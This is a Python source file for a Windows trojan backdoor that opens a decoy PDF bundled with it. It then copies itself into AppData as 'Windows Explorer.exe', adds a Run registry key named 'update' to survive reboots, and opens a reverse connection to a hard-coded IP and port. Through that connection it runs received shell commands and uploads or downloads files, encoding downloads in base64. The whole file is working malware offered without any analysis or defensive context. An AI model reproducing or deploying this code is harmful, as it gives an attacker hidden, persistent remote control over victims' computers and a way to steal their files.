#! /usr/bin/env python


import socket
import subprocess
import json
import os
import base64
import sys
import shutil



class BackDoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evel_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evel_file_location):
            shutil.copyfile(sys.executable, evel_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evel_file_location + '"', shell=True)

    def reliable_send(self, data):
        jsan_data = json.dumps(data)
        self.connection.send(jsan_data)


    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def excute_system(self, command):

        return subprocess.check_output(command, shell=True)

    def chang_working_directory(self, path):
        os.chdir(path)
        return "changing directory" + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return " upload succesfull"

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.chang_working_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1])

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.excute_system(command)
            except Exception:
                command_result = " Error during command exe"

            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\ashan.pdf"
subprocess.Popen(file_name, shell=True)

try:
    myback = BackDoor("192.168.81.150", 4444)
    myback.run()
except Exception:
    sys.exit()


